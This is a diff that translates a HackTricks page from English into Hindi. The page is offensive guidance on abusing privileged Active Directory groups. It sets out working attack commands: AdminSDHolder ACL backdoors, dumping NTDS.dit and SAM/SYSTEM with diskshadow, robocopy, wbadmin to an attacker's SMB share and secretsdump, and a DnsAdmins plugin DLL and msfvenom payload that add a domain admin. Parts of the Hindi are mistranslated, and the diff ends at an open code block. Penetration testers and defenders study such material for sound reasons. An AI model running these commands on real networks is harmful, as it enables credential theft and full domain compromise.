@@ -1,104 +1,93 @@
-# Privileged Groups
+# विशेषाधिकार वाले समूह
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
+* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
+* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **फॉलो** करें मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-## Known groups with administration privileges
+## प्रशासनिक विशेषाधिकार वाले ज्ञात समूह
 
-* **Administrators**
-* **Domain Admins**
-* **Enterprise Admins**
+* **प्रशासक**
+* **डोमेन व्यवस्थापक**
+* **एंटरप्राइज व्यवस्थापक**
 
-There are other account memberships and access token privileges that can also be useful during security assessments when chaining multiple attack vectors.
+सुरक्षा मूल्यांकन के दौरान एकाधिक हमला वेक्टर चेन करते समय अन्य खाता सदस्यता और पहुँच टोकन विशेषाधिकार भी उपयोगी हो सकते हैं।
 
-## Account Operators <a href="#account-operators" id="account-operators"></a>
+## खाता ऑपरेटर्स <a href="#account-operators" id="account-operators"></a>
 
-* Allows creating non administrator accounts and groups on the domain
-* Allows logging in to the DC locally
+* डोमेन पर गैर प्रशासक खाते और समूह बनाने की अनुमति देता है
+* DC में स्थानीय रूप से लॉग इन करने की अनुमति देता है
 
-Get **members** of the group:
-
+समूह के **सदस्य** प्राप्त करें:
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
-
-Note the spotless' user membership:
+नोट करें स्पॉटलेस उपयोगकर्ता सदस्यता:
 
 ![](<../../.gitbook/assets/1 (2) (1) (1).png>)
 
-However, we can still add new users:
+हालांकि, हम अभी भी नए उपयोगकर्ता जोड़ सकते हैं:
 
 ![](../../.gitbook/assets/a2.png)
 
-As well as login to DC01 locally:
+साथ ही, DC01 में स्थानीय रूप से लॉगिन कर सकते हैं:
 
 ![](../../.gitbook/assets/a3.png)
 
-## AdminSDHolder group
+## AdminSDHolder समूह
 
-The Access Control List (ACL) of the **AdminSDHolder** object is used as a template to **copy** **permissions** to **all “protected groups”** in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.\
-By default, the ACL of this group is copied inside all the "protected groups". This is done to avoid intentional or accidental changes to these critical groups. However, if an attacker modifies the ACL of the group **AdminSDHolder** for example giving full permissions to a regular user, this user will have full permissions on all the groups inside the protected group (in an hour).\
-And if someone tries to delete this user from the Domain Admins (for example) in an hour or less, the user will be back in the group.
+**AdminSDHolder** ऑब्जेक्ट की एक्सेस कंट्रोल सूची (ACL) का उपयोग Active Directory में सभी "संरक्षित समूहों" को **अनुमतियों** की **प्रतिलिपि** करने के लिए किया जाता है। संरक्षित समूहों में विशेषाधिकारी समूह शामिल हैं जैसे कि डोमेन व्यवस्थापक, प्रशासक, एंटरप्राइज व्यवस्थापक और स्कीमा व्यवस्थापक।\
+डिफ़ॉल्ट रूप से, इस समूह की ACL सभी "संरक्षित समूहों" के अंदर कॉपी की जाती है। इसका उद्देश्य यह है कि इन महत्वपूर्ण समूहों में इच्छित या अकस्मात बदलाव से बचा जा सके। हालांकि, यदि कोई हमलावर उदाहरण के लिए समूह **AdminSDHolder** की ACL को संशोधित करता है और एक साधारण उपयोगकर्ता को पूर्ण अनुमतियाँ देता है, तो इस उपयोगकर्ता को संरक्षित समूह के अंदर सभी समूहों पर पूर्ण अनुमतियाँ होंगी (एक घंटे में)।\
+और यदि कोई इस उपयोगकर्ता को डोमेन व्यवस्थापकों से हटाने की कोशिश करता है (उदाहरण के लिए) एक घंटे या उससे कम समय में, तो उपयोगकर्ता समूह में वापस आ जाएगा।
 
-Get **members** of the group:
-
+समूह के **सदस्यों** को प्राप्त करें:
 ```powershell
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 ```
-
-Add a user to the **AdminSDHolder** group:
-
+**AdminSDHolder** समूह में एक उपयोगकर्ता जोड़ें:
 ```powershell
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 ```
-
-Check if the user is inside the **Domain Admins** group:
-
+जांचें कि क्या उपयोगकर्ता **Domain Admins** समूह में है:
 ```powershell
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
+यदि आप एक घंटे तक प्रतीक्षा नहीं करना चाहते हैं, तो आप एक PS स्क्रिप्ट का उपयोग करके तत्काल पुनर्स्थापना कर सकते हैं: [https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)
 
-If you don't want to wait an hour you can use a PS script to make the restore happen instantly: [https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)
-
-[**More information in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
+[**अधिक जानकारी ired.team में।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
 
 ## **AD Recycle Bin**
 
-This group gives you permission to read deleted AD object. Something juicy information can be found in there:
-
+यह समूह आपको हटाए गए AD ऑब्जेक्ट को पढ़ने की अनुमति देता है। वहां कुछ रोचक जानकारी मिल सकती है:
 ```bash
 #This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
 #You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
+### डोमेन कंट्रोलर एक्सेस
 
-### Domain Controller Access
-
-Note how we cannot access files on the DC with current membership:
+ध्यान दें कि हम वर्तमान सदस्यता के साथ डीसी पर फ़ाइलों तक पहुंच नहीं कर सकते हैं:
 
 ![](../../.gitbook/assets/a4.png)
 
-However, if the user belongs to `Server Operators`:
+हालांकि, यदि उपयोगकर्ता `सर्वर ऑपरेटर्स` में शामिल है:
 
 ![](../../.gitbook/assets/a5.png)
 
-The story changes:
+कहानी बदल जाती है:
 
 ![](../../.gitbook/assets/a6.png)
 
 ### Privesc <a href="#backup-operators" id="backup-operators"></a>
 
-Use [`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) or `sc`, form Sysinternals, to check permissions on a service.
-
+सेवा पर अनुमतियों की जांच करने के लिए [`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) या `sc`, सिसइंटरनल्स से, का उपयोग करें।
 ```
 C:\> .\PsService.exe security AppReadiness
 
@@ -108,29 +97,25 @@ Sysinternals - www.sysinternals.com
 
 [...]
 
-        [ALLOW] BUILTIN\Server Operators
-                All
+[ALLOW] BUILTIN\Server Operators
+All
 ```
-
-This confirms that the Server Operators group has [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) access right, which gives us full control over this service.\
-You can abuse this service to [**make the service execute arbitrary commands**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#modify-service-binary-path) and escalate privileges.
+यह सत्यापित करता है कि Server Operators समूह में [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) एक्सेस राइट है, जो हमें इस सेवा पर पूर्ण नियंत्रण प्रदान करता है।\
+आप इस सेवा का दुरुपयोग करके इस सेवा को अभिमानी आदेशों को निष्पादित करने के लिए और प्रभावी अधिकारों को बढ़ाने के लिए कर सकते हैं।
 
 ## Backup Operators <a href="#backup-operators" id="backup-operators"></a>
 
-As with `Server Operators` membership, we can **access the `DC01` file system** if we belong to `Backup Operators`.
+`Server Operators` सदस्यता की तरह, हम `Backup Operators` में शामिल होने पर **`DC01` फ़ाइल सिस्टम तक पहुंच** कर सकते हैं।
 
-This is because this group grants its **members** the [**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) and [**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5) privileges. The **SeBackupPrivilege** allows us to **traverse any folder and list** the folder contents. This will let us **copy a file from a folder,** even if nothing else is giving you permissions. However, to abuse this permissions to copy a file the flag [**FILE\_FLAG\_BACKUP\_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) \*\*\*\* must be used. Therefore, special tools are needed.
+इसलिए इस समूह अपने सदस्यों को [**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) और [**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5) विशेषाधिकार प्रदान करता है। **SeBackupPrivilege** हमें किसी भी फ़ोल्डर को ट्रावर्स करने और फ़ोल्डर की सामग्री की सूची बनाने की अनुमति देता है। इससे हमें किसी फ़ोल्डर से एक फ़ाइल की प्रतिलिपि बनाने की अनुमति मिलेगी, यदि कुछ और आपको अनुमति नहीं दे रहा है। हालांकि, एक फ़ाइल की प्रतिलिपि बनाने के लिए इस अनुमति का दुरुपयोग करने के लिए झंडा [**FILE_FLAG_BACKUP_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) का उपयोग किया जाना चाहिए। इसलिए, विशेष उपकरणों की आवश्यकता होती है।
 
-For this purpose you can use [**these scripts**](https://github.com/giuliano108/SeBackupPrivilege)**.**
+इस उद्देश्य के लिए आप [**ये स्क्रिप्ट**](https://github.com/giuliano108/SeBackupPrivilege) का उपयोग कर सकते हैं।
 
-Get **members** of the group:
-
+समूह के **सदस्य** प्राप्त करें:
 ```powershell
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
-
-### **Local Attack**
-
+### **स्थानीय हमला**
 ```bash
 # Import libraries
 Import-Module .\SeBackupPrivilegeUtils.dll
@@ -145,19 +130,17 @@ Get-SeBackupPrivilege
 dir C:\Users\Administrator\
 Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Overwrite
 ```
+### AD हमला
 
-### AD Attack
-
-For instance, you can directly access the Domain Controller file system:
+उदाहरण के लिए, आप सीधे डोमेन कंट्रोलर फ़ाइल सिस्टम तक पहुंच सकते हैं:
 
 ![](../../.gitbook/assets/a7.png)
 
-You can abuse this access to **steal** the active directory database **`NTDS.dit`** to get all the **NTLM hashes** for all user and computer objects in the domain.
+आप इस पहुंच का दुरुपयोग करके एक्टिव डायरेक्टरी डेटाबेस **`NTDS.dit`** को चोरी कर सकते हैं और डोमेन में सभी उपयोगकर्ता और कंप्यूटर ऑब्जेक्ट्स के लिए सभी **NTLM हैश** प्राप्त कर सकते हैं।
 
-#### Using diskshadow.exe to dumo NTDS.dit
+#### NTDS.dit को डंप करने के लिए diskshadow.exe का उपयोग
 
-Using [**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) you can **create a shadow copy** of the **`C` drive** and in the `F` drive for example. The, you can steal the `NTDS.dit` file from this shadow copy as it won't be in use by the system:
-
+[**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) का उपयोग करके आप **`C` ड्राइव** और उदाहरण के लिए `F` ड्राइव में **शैडो कॉपी बना सकते हैं**। फिर, आप इस शैडो कॉपी से `NTDS.dit` फ़ाइल चुरा सकते हैं क्योंकि यह सिस्टम द्वारा उपयोग में नहीं होगी:
 ```
 diskshadow.exe
 
@@ -176,39 +159,30 @@ DISKSHADOW> expose %cdrive% F:
 DISKSHADOW> end backup
 DISKSHADOW> exit
 ```
-
-As in the local attack, you can now copy the privileged file **`NTDS.dit`**:
-
+जैसा कि स्थानीय हमले में, अब आप विशेषाधिकारित फ़ाइल **`NTDS.dit`** की प्रतिलिपि बना सकते हैं:
 ```
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
-
-Another way to copy files is using [**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)**:**
-
+फ़ाइलें कॉपी करने का एक और तरीका है [**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)**:**
 ```
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
-
-Then, you can easily **steal** the **SYSTEM** and **SAM**:
-
+तब आप आसानी से **SYSTEM** और **SAM** को **चुरा सकते हैं**:
 ```
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
 ```
-
-Finally you can **get all the hashes** from the **`NTDS.dit`**:
-
+अंत में आप **`NTDS.dit`** से **सभी हैश** प्राप्त कर सकते हैं:
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
+#### NTDS.dit को डंप करने के लिए wbadmin.exe का उपयोग करें
 
-#### Using wbadmin.exe to dumo NTDS.dit
+wbadmin.exe का उपयोग करना diskshadow.exe के उपयोग के बहुत समान है, wbadmin.exe उपयोगीता एक कमांड लाइन उपयोगीता है जो Windows में बनी हुई है, Windows Vista/Server 2008 से पहले से ही।
 
-Using wbadmin.exe is very similar to diskshadow.exe, the wbadmin.exe utility is a command line utility built into Windows, since Windows Vista/Server 2008. 
+इसका उपयोग करने से पहले, आपको अपनी हमलावर मशीन पर smb सर्वर के लिए ntfs फ़ाइल सिस्टम सेटअप करनी होगी।
 
-Before using it, you need to [**setup ntfs filesystem for smb server**](https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801) on the attacker machine.
-
-When you finished to setup smb server, you need to cache the smb credential on target machine:
+जब आप smb सर्वर को सेटअप करने के लिए समाप्त कर चुके हों, तो आपको लक्षित मशीन पर smb क्रेडेंशियल को कैश करने की आवश्यकता होगी:
 ```
 # cache the smb credential.
 net use X: \\<AttackIP>\sharename /user:smbuser password
@@ -216,9 +190,7 @@ net use X: \\<AttackIP>\sharename /user:smbuser password
 # check if working.
 dir X:\
 ```
-
-If no error, use wbadmin.exe to exploit it: 
-
+यदि कोई त्रुटि नहीं है, तो इसका उपयोग करें wbadmin.exe को इसका शोध करने के लिए:
 ```
 # Start backup the system.
 # In here, no need to use `X:\`, just using `\\<AttackIP>\sharename` should be ok.
@@ -230,83 +202,72 @@ wbadmin get versions
 # Restore the version to dump ntds.dit.
 echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
 ```
-If it successful, it will dump into `C:\ntds.dit`.
+यदि यह सफल होता है, तो यह `C:\ntds.dit` में डंप हो जाएगा।
 
-[DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)
+[IPPSEC के साथ डेमो वीडियो](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)
 
 ## DnsAdmins
 
-A user who is member of the **DNSAdmins** group or have **write privileges to a DNS** server object can load an **arbitrary DLL** with **SYSTEM** privileges on the **DNS server**.\
-This is really interesting as the **Domain Controllers** are **used** very frequently as **DNS servers**.
+**DNSAdmins** समूह के सदस्य या **DNS** सर्वर ऑब्जेक्ट पर **लेखन अधिकार** रखने वाले उपयोगकर्ता **SYSTEM** अधिकारों के साथ एक **विचित्र DLL** लोड कर सकते हैं।\
+यह बहुत दिलचस्प है क्योंकि **Domain Controllers** को अक्सर **DNS सर्वर** के रूप में उपयोग किया जाता है।
 
-As shown in this \*\*\*\* [**post**](https://adsecurity.org/?p=4064), the following attack can be performed when DNS is run on a Domain Controller (which is very common):
+जैसा कि इस \*\*\*\* [**पोस्ट**](https://adsecurity.org/?p=4064) में दिखाया गया है, जब DNS एक डोमेन कंट्रोलर पर चलाया जाता है (जो बहुत सामान्य है), तो निम्नलिखित हमला किया जा सकता है:
 
-* DNS management is performed over RPC
-* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to **load** a custom **DLL** with **zero verification** of the DLL's path. This can be done with the `dnscmd` tool from the command line
-* When a member of the **`DnsAdmins`** group runs the **`dnscmd`** command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
-* When the **DNS service is restarted**, the **DLL** in this path will be **loaded** (i.e., a network share that the Domain Controller's machine account can access)
-* An attacker can load a **custom DLL to obtain a reverse shell** or even load a tool such as Mimikatz as a DLL to dump credentials.
+* DNS प्रबंधन RPC के माध्यम से किया जाता है
+* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) हमें एक कस्टम **DLL** को **लोड** करने की अनुमति देता है, DLL के पथ की **कोई सत्यापन** नहीं की जाती है। इसे कमांड लाइन से `dnscmd` टूल के साथ किया जा सकता है
+* जब **`DnsAdmins`** समूह का सदस्य **`dnscmd`** निम्नलिखित कमांड चलाता है, तो `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` रजिस्ट्री कुंजी पूरी होती है
+* जब **DNS सेवा पुनः चालू** होती है, तो इस पथ में दिए गए **DLL** को **लोड** किया जाएगा (अर्थात्, एक नेटवर्क शेयर जिसमें डोमेन कंट्रोलर के मशीन खाते तक पहुंच हो सकती है)
+* एक हमलावर एक **कस्टम DLL लोड करके एक रिवर्स शेल प्राप्त** कर सकता है या यहां तक कि क्रेडेंशियल्स डंप करने के लिए Mimikatz जैसा एक उपकरण भी लोड कर सकता है।
 
-Get **members** of the group:
-
+समूह के **सदस्य** प्राप्त करें:
 ```powershell
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
+### किसी भी DLL को निष्पादित करें
 
-### Execute arbitrary DLL
-
-Then, if you have a user inside the **DNSAdmins group**, you can make the **DNS server load an arbitrary DLL with SYSTEM privileges** (DNS service runs as `NT AUTHORITY\SYSTEM`). You can make the DNS server load a **local or remote** (shared by SMB) DLL file executing:
-
+फिर, यदि आपके पास **DNSAdmins समूह** में एक उपयोगकर्ता है, तो आप **DNS सर्वर को SYSTEM विशेषाधिकारों के साथ किसी भी DLL को लोड करने** के लिए बना सकते हैं (DNS सेवा `NT AUTHORITY\SYSTEM` के रूप में चलती है)। आप DNS सर्वर को लोड करने के लिए एक **स्थानीय या दूरस्थ** (SMB द्वारा साझा किया गया) DLL फ़ाइल को निष्पादित कर सकते हैं:
 ```
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
 ```
-
-An example of a valid DLL can be found in [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL). I would change the code of the function `DnsPluginInitialize` to something like:
-
+एक मान्य DLL का उदाहरण [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL) में मिल सकता है। मैं `DnsPluginInitialize` फ़ंक्शन के कोड को इस तरह से बदलना चाहूंगा:
 ```c
 DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
 {
-		system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
-		system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
+system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
+system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
 }
 ```
-
-Or you could generate a dll using msfvenom:
-
+या आप msfvenom का उपयोग करके एक DLL उत्पन्न कर सकते हैं:
 ```bash
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
+तो, जब **DNS सेवा** शुरू या पुनरारंभ होती है, एक नया उपयोगकर्ता बनाया जाएगा।
 
-So, when the **DNSservice** start or restart, a new user will be created.
-
-Even having a user inside DNSAdmin group you **by default cannot stop and restart the DNS service.** But you can always try doing:
-
+DNSAdmin समूह में एक उपयोगकर्ता होने के बावजूद आप **डीएनएस सेवा को रोकने और पुनरारंभ करने के लिए डिफ़ॉल्ट रूप से नहीं कर सकते हैं।** लेकिन आप हमेशा कोशिश कर सकते हैं:
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-
-[**Learn more about this privilege escalation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
+[**इस विशेषाधिकार वृद्धि के बारे में और अधिक जानें ired.team पर।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
 
 #### Mimilib.dll
 
-As detailed in this [**post**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), It's also possible to use [**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain command execution by **modifying** the [**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) \*\*\*\* file to execute a **reverse shell** one-liner or another command of our choosing.
+इस [**पोस्ट**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) में विस्तार से बताया गया है कि `Mimikatz` उपकरण के निर्माता द्वारा [**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) का उपयोग करके हम कमांड निष्पादन प्राप्त करने के लिए [**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) \*\*\*\* फ़ाइल को **संशोधित** करके एक **रिवर्स शेल** वन-लाइनर या हमारी पसंद की अन्य कमांड को निष्पादित करना संभव है।
 
-### WPAD Record for MitM
+### MitM के लिए WPAD रिकॉर्ड
 
-Another way to **abuse DnsAdmins** group privileges is by creating a **WPAD record**. Membership in this group gives us the rights to [disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), which by default blocks this attack. Server 2008 first introduced the ability to add to a global query block list on a DNS server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list. These protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names.
+DnsAdmins समूह की विशेषाधिकार का दुरुपयोग करने का एक और तरीका है **WPAD रिकॉर्ड** बनाना। इस समूह में सदस्यता हमें [वैश्विक क्वेरी ब्लॉक सुरक्षा अक्षम करने](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps) की अनुमति देती है, जो डिफ़ॉल्ट रूप से इस हमले को ब्लॉक करती है। सर्वर 2008 ने पहली बार एक DNS सर्वर पर एक वैश्विक क्वेरी ब्लॉक सूची में जोड़ने की क्षमता पेश की। डिफ़ॉल्ट रूप से, वेब प्रॉक्सी स्वचालित खोज प्रोटोकॉल (WPAD) और साइट-आंतरिक स्वचालित टनल पता प्रोटोकॉल (ISATAP) वैश्विक क्वेरी ब्लॉक सूची में होते हैं। ये प्रोटोकॉल हाइजैकिंग के लिए काफी संवेदनशील होते हैं, और कोई भी डोमेन उपयोगकर्ता उन नामों को समारोह विषयक या DNS रिकॉर्ड बना सकता है।
 
-After **disabling the global query** block list and creating a **WPAD record**, **every machine** running WPAD with default settings will have its **traffic proxied through our attack machine**. We could use a tool such as \*\*\*\* [**Responder**](https://github.com/lgandx/Responder) **or** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **to perform traffic spoofing**, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.
+**वैश्विक क्वेरी ब्लॉक** सूची को अक्षम करने और **WPAD रिकॉर्ड** बनाने के बाद, **हर मशीन** जो डिफ़ॉल्ट सेटिंग्स के साथ WPAD चला रही है, अपना **ट्रैफ़िक हमारी हमला मशीन के माध्यम से प्रॉक्सी करेगी**। हम ट्रैफ़िक स्पूफ़िंग करने के लिए उपकरण जैसे \*\*\*\* [**Responder**](https://github.com/lgandx/Responder) **या** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **का उपयोग कर सकते हैं**, और पासवर्ड हैश को पकड़ने और ऑफ़लाइन में उन्हें क्रैक करने या एक SMBRelay हमला करने का प्रयास कर सकते हैं।
 
 {% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
 [spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
 {% endcontent-ref %}
 
-## Event Log Readers
+## ईवेंट लॉग पाठक
 
-Members of the [**Event Log Readers**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) \*\*\*\* group have **permission to access the event logs** generated (such as the new process creation logs). In the logs **sensitive information** could be found. Let's see how to visualize the logs:
-
+[**ईवेंट लॉग पाठक**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) \*\*\*\* समूह के सदस्यों को **ईवेंट लॉग्स तक पहुंच की अनुमति** होती है (जैसे नई प्रक्रिया निर्माण लॉग्स)। लॉग्स में **संवेदनशील जानकारी** मिल सकती है। चलिए देखते हैं कि लॉग्स को दृश्यीकरण कैसे करें:
 ```powershell
 #Get members of the group
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
@@ -320,137 +281,112 @@ wevtutil qe Security /rd:true /f:text /r:share01 /u:<username> /p:<pwd> | findst
 # Search using PowerShell
 Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
 ```
+## एक्सचेंज विंडोज़ अनुमतियाँ
 
-## Exchange Windows Permissions
+सदस्यों को **डोमेन ऑब्जेक्ट पर एक डैकल लिखने** की क्षमता प्रदान की जाती है। एक हमलावर इसका दुरुपयोग करके एक उपयोगकर्ता को [**DCSync**](dcsync.md) विशेषाधिकार प्रदान कर सकता है।
+यदि AD परिवेश में Microsoft Exchange स्थापित है, तो इस समूह के सदस्य के रूप में उपयोगकर्ता खाते और कंप्यूटरों को खोजना सामान्य है।
 
-Members are granted the ability to **write a DACL to the domain object**. An attacker could abuse this to **give a user** [**DCSync**](dcsync.md) privileges.\
-If Microsoft Exchange is installed in the AD environment, It is common to find user accounts and even computers as members of this group.
-
-This [**GitHub repo**](https://github.com/gdedrouas/Exchange-AD-Privesc) explains a few **techniques** to **escalate privileges** abusing this group permissions.
-
+यह [**GitHub रेपो**](https://github.com/gdedrouas/Exchange-AD-Privesc) इस समूह की अनुमतियों का दुरुपयोग करके विशेषाधिकारों को बढ़ाने के कुछ **तकनीकों** की व्याख्या करता है।
 ```powershell
